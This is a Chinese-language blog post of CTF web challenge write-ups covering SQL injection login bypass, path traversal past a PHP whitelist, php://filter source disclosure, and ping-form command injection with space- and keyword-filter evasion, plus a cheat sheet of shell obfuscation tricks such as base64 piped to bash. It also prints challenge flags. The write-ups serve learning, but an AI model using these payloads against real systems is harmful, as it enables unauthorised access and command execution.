---
title: 【随缘更新中】ctf web类解密
date: 2024-11-14
slug: web-ctf
image: cover.png
tag: 
    - CTF
    - 网络安全
    - web
categories: 
    - 网络安全

---

## [极客大挑战 2019]EasySQL

用户名随意，密码：

````sql
' or 1=1;#
````

原理：SQL简单注入

````sql
SELECT * FROM users WHERE username = 'admin' AND password = '用户输入的密码';
#被更改为：
SELECT * FROM users WHERE username = 'admin' AND password = '' OR 1=1;#';
````
`'`结束了密码的输入，`or`新加条件判断，`#`将后面变为注释，因为 `1=1`恒等于true，所以密码判断为真，直接登入成功。

`flag{bfec2c7f-5da3-426b-9736-04ceb6ff2283}`

## [极客大挑战 2019]Havefun

注释中找到了很有意思的东西：

````php
<!--
        $cat=$_GET['cat'];
        echo $cat;
        if($cat=='dog'){
            echo 'Syc{cat_cat_cat_cat}';
        }
        -->
````

payload:`?cat=dog`

得到flag：`flag{6e7317ce-c4ce-4112-809e-9c88c6d44a83}`

## [HCTF 2018]WarmUp

源码得到`source.php`，访问得到：

````php
<?php
    highlight_file(__FILE__);
    class emmm
    {
        public static function checkFile(&$page)
        {
            $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
            if (! isset($page) || !is_string($page)) {
                echo "you can't see it";
                return false;
            }

            if (in_array($page, $whitelist)) {
                return true;
            }

            $_page = mb_substr(
                $page,
                0,
                mb_strpos($page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }

            $_page = urldecode($page);
            $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }
            echo "you can't see it";
            return false;
        }
    }
    if (! empty($_REQUEST['file'])
        && is_string($_REQUEST['file'])
        && emmm::checkFile($_REQUEST['file'])
    ) {
        include $_REQUEST['file'];
        exit;
    } else {
        echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
    }  
?>
````

分析代码，需要传入一个名为`file`的参数，需满足以下条件：

1. 是字符串

2. 在`whitelist`中

注意`mb_strpos($page . '?', '?')`，它负责以`?`分割出文件名，来判断是否在`whitelist`中，所以?后可以随便写。

只要满足条件，`include $_REQUEST['file'];`就可以被执行，显示file传入的文件。

通过访问`/hint.php`得到：

`flag not here, and flag in ffffllllaaaagggg`

payload:`/source.php?file=source.php?/../../../../ffffllllaaaagggg`

基于以上，在多次跳转上一目录后，得到了flag：

`flag{5026a355-8b4e-4d00-8f08-a71a732e854c}`

## Linux命令执行(下面几道题道题的前置知识)

[参考](https://www.freebuf.com/articles/web/293411.html)

1）`||` 符号 当前一条命令执行结果为false 就执行下一条命令

2）`|` 符号 只执行 | 符号后面的命令

3）`&&` 符号 当前一条命令执行结果为true 就执行下一条命令

4）`&` 符号 只执行 & 符号后面的命令

5）`;` 符号 不管前一条命令执行的结果是什么，执行下一条命令

6）a=l;b=s;$a$b        //变量覆盖

7）` \echo d2hvYW1p | base64 -d `     echo d2hvYW1p | base64 -d | bash         //base64绕过

8）w`saaaddd8450`ho`762aseba2`am`f0j71`i      wh$(caigou)oa$(anquan)mi       666`whoami`666      //反引号加混淆

9）wh$1oami        who$@ami        whoa$*mi       //$1、$@、$*混淆


## [ACTF2020 新生赛]Include

通过名字，猜测需要读取源码，

利用`php伪协议`，payload:`?file=php://filter/read=convert.base64-encode/resource=flag.php`

得到内容base64解密得到：

`echo "Can you find out the flag?";`

`//flag{94c1e2f9-f482-4a77-9d04-fe9740ff2ee6}`

## [ACTF2020 新生赛]Exec

因为Linux可以同时写两个命令：

````bash
命令1|命令2
````

所以可以在ip后面加上其他的命令，比如`ls`，一层一层找，找到了flag：

`flag{86f478de-728b-40dc-aa9e-4be502142f24}`

payload: `127.0.0.1|ls ./../../../flag`

## [GXYCTF2019]Ping Ping Ping

故技重施，被骂了呜呜呜：

````
/?ip=127.0.0.1|cat%20flag.php

/?ip= fxck your space!
````

看来过滤了空格，尝试绕过：

````
$IFS
${IFS}
$IFS$1 
````

尝试直接输出`flag.php`，发现flag也被过滤，所以先尝试读取`index.php`：

payload: `?ip=127.0.0.1|cat$IFS$1index.php`

````php
|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match)){
    echo preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{20}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match);
    die("fxck your symbol!");
  } else if(preg_match("/ /", $ip)){
    die("fxck your space!");
  } else if(preg_match("/bash/", $ip)){
    die("fxck your bash!");
  } else if(preg_match("/.*f.*l.*a.*g.*/", $ip)){
    die("fxck your flag!");
  }
  $a = shell_exec("ping -c 4 ".$ip);
  echo "
";
  print_r($a);
}

?>
````